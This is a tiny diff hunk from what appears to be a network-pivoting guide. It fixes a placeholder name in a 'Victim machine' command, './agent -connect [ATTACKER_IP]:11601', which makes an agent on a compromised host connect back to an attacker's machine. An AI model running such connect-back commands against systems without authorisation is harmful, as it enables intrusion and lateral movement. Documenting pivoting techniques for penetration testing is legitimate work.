@@ -35,5 +35,5 @@ start
 ```
 # Victim machine
 ```
-./agent -connect [ATTACKERIP]:11601
+./agent -connect [ATTACKER_IP]:11601
 ```
